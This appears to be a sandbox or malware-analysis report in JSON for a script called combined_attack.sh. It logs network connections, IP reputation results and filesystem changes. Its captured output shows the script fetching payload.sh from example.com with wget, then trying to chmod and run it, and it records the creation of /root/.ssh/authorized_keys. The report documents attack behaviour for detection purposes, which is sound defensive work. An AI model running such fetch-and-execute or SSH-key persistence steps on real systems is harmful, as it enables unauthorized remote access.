@@ -1,0 +1,50 @@
+{
+  "target_file": "/tmp/tmpaat4vl79/home/user/Documents/combined_attack.sh",
+  "execution_time": 2,
+  "exit_code": 2,
+  "network_connections": [
+    {
+      "protocol": "tcp",
+      "destination_ip": "192.168.65.7",
+      "port": 53,
+      "hits": 4
+    },
+    {
+      "protocol": "tcp",
+      "destination_ip": "172.66.147.243",
+      "port": 80,
+      "hits": 1
+    }
+  ],
+  "traffic_verdict": [
+    {
+      "abuseConfidenceScore": 0,
+      "countryName": "United States of America",
+      "ip": "172.66.147.243",
+      "isTor": false,
+      "totalReports": 0
+    },
+    {
+      "abuseConfidenceScore": 0,
+      "countryName": null,
+      "ip": "192.168.65.7",
+      "isTor": false,
+      "totalReports": 0
+    }
+  ],
+  "filesystem_changes": {
+    "modified": [
+      "/root"
+    ],
+    "new": [
+      "/root/.ssh",
+      "/root/.ssh/authorized_keys"
+    ],
+    "deleted": []
+  },
+  "malware_output": {
+    "content": "Linux 434198e18608 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\n--2026-06-24 15:40:24--  http://example.com/payload.sh\nResolving example.com (example.com)... 172.66.147.243, 104.20.23.154\nConnecting to example.com (example.com)|172.66.147.243|:80... connected.\nHTTP request sent, awaiting response... 404 Not Found\n2026-06-24 15:40:24 ERROR 404: Not Found.\n\nchmod: cannot access 'payload.sh': No such file or directory\nsh: 0: cannot open payload.sh: No such file",
+    "lines": 9,
+    "truncated": false
+  }
+}
